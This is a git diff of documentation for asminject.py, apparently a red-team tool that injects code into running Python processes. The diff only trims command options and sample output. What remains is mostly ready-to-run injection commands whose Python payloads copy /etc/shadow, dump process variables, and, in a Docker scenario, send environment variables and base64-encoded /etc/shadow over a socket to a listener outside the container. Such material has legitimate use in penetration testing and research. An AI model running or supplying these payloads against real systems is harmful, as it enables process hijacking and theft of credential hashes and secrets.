@@ -26,7 +26,7 @@ This payload requires one variable: `pythoncode`, which should contain the Pytho
 
 ```
 # python3 ./asminject.py 2037475 execute_python_code.s \
-   --arch x86-64 --relative-offsets-from-binaries \
+   --relative-offsets-from-binaries \
    --non-pic-binary "/usr/bin/python3\\.[0-9]+" \
    --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
    
@@ -49,8 +49,8 @@ sys:*:18704:0:99999:7:::
 If you're targeting a legacy Python 2 process instead of Python 3, you'll most likely need to omit the `--non-pic-binary` option, e.g. same as the previous example, except:
 
 ```
-# python3 ./asminject.py 2144294 execute_python_code.s --relative-offsets-from-binaries \
-   ---arch x86-64 -stop-method "slow" \
+# python3 ./asminject.py 2144294 execute_python_code.s \
+   --relative-offsets-from-binaries \
    --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
 ```
 
@@ -74,18 +74,18 @@ tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.ite
 e.g.
 
 ```
-# python3 ./asminject.py 249594 execute_python_code.s --arch x86-64 \
+# python3 ./asminject.py 249594 execute_python_code.s \
    --relative-offsets-from-binaries \
-   --non-pic-binary "/usr/bin/python3\\.[0-9]+" --stop-method "slow" \
+   --non-pic-binary "/usr/bin/python3\\.[0-9]+" \
    --var pythoncode "tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items() if not k.startswith('_') and k!='tmp' and k!='In' and k!='Out' and not hasattr(v, '__call__')]"
 ```
 
 or
 
 ```
-# python3 ./asminject.py 249594 execute_python_code.s --arch x86-64 \
+# python3 ./asminject.py 249594 execute_python_code.s \
    --relative-offsets-from-binaries \
-   --non-pic-binary "/usr/bin/python3\\.[0-9]+" --stop-method "slow" \
+   --non-pic-binary "/usr/bin/python3\\.[0-9]+" \
    --var pythoncode "tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items() if not k.startswith('_') and k!='tmp' and k!='In' and k!='Out' and not hasattr(v, '__call__')]"
 ```
 
@@ -108,7 +108,8 @@ This scenario simulates a container that either does not allow access to an inte
 
 Start a Python 3 process in a Docker container:
 ```
-# docker run -v $(pwd)/practice/python_loop.py:/tmp/python_loop.py --network=host -ti fedora
+# docker run -v $(pwd)/practice/python_loop.py:/tmp/python_loop.py \
+   --network=host -ti fedora
 
 latest: Pulling from library/fedora
 e1deda52ffad: Pull complete 
@@ -124,13 +125,13 @@ Locate the process ID for the Python process, then get a list of the binaries it
 # ps auxww | grep python                  
 
 ...omitted for brevity...
-root     2378331  0.0  0.1  10148  7268 pts/0    S+   14:30   0:00 python3 /tmp/python_loop.py
+root     2378331  [...] python3 /tmp/python_loop.py
 
 # cat /proc/2378331/maps
 
-556d84513000-556d84514000 r--p 00000000 08:01 624517                     /usr/bin/python3.10
+556d84513000-556d84514000 r--p [...] /usr/bin/python3.10
 ...omitted for brevity...
-7f8483e8b000-7f8483ee4000 r--p 00000000 08:01 626234                     /usr/lib64/libpython3.10.so.1.0
+7f8483e8b000-7f8483ee4000 r--p [...] /usr/lib64/libpython3.10.so.1.0
 ...omitted for brevity...
 ```
 
@@ -178,9 +179,7 @@ Then, in another terminal:
 
 ```
 # python3 ./asminject.py 2378331 execute_python_code.s \
-   --arch x86-64 \
    --relative-offsets relative-offsets-docker-fedora-libpython3.10.txt \
-   --stop-method "slow" \
    --var pythoncode 'import os; import socket; s = socket.socket(); s.connect((\"127.0.0.1\", 7777)); s.send(f\"{os.environ}\".encode()); s.close()'
 ```
 
@@ -197,9 +196,7 @@ Copy a file out of the container:
 
 ```
 # python3 ./asminject.py 2378331 execute_python_code.s \
-   --arch x86-64 \
    --relative-offsets relative-offsets-docker-fedora-libpython3.10.txt \
-   --stop-method "slow" \
    --var pythoncode 'import base64; import os; import socket; f = open(\"/etc/shadow\", mode=\"rb\"); content = f.read(); f.close(); encoded = base64.b64encode(content); s = socket.socket(); s.connect((\"127.0.0.1\", 7777)); s.send(encoded); s.close();'
 ```
 
